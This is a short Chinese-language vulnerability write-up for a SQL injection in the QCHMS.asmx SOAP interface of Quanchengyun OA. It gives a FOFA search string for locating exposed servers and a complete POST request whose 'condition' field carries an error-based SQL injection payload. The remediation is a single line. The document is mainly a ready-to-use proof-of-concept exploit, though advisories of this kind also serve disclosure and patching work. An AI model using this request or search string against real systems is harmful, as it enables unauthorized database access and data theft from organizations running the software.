# 全程云OA QCHMS.asmx  SQL注入漏洞

全程云OA QCHMS.asmx  SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

全程云OA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="images/yipeoplehover.png"

POC/EXP：

```
POST /OA/HMS/QCHMS.asmx HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetProjectResumeList"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetProjectResumeList xmlns="http://tempuri.org/">
      <pageIndex>1</pageIndex>
      <pageSize>20</pageSize>
      <condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (1078=1078) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>
    </GetProjectResumeList>
  </soap:Body>
</soap:Envelope>
```

![image-20260108141321906](assets/image-20260108141321906.png)

```

```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
